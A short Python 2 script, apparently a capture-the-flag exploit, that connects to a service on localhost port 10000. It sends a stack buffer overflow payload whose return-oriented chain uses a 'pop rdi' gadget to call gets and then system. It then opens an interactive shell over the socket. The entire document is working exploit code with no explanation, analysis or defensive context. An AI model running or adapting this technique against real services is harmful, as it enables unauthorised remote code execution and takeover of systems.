import socket
import struct
import telnetlib

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("localhost",10000))

print(s.recv(1024))

# Create payload

# pop rdi = 0x400763

buf = 'A' * 0x80
buf += 'A' * 8
buf += struct.pack("<Q",0x400763) # return address (pop rdi)
buf += struct.pack("<Q",0x601058) # gets arg
buf += struct.pack("<Q",0x400570) # gets got
buf += struct.pack("<Q",0x400763) # return address (pop rdi)
buf += struct.pack("<Q",0x601058) # system arg
buf += struct.pack("<Q",0x400540) # system got
buf += "\n"

fd = open('buf','wb')
fd.write(buf)
fd.close()

s.send(buf)

print(s.recv(1024))

t = telnetlib.Telnet()
t.sock = s
t.interact()
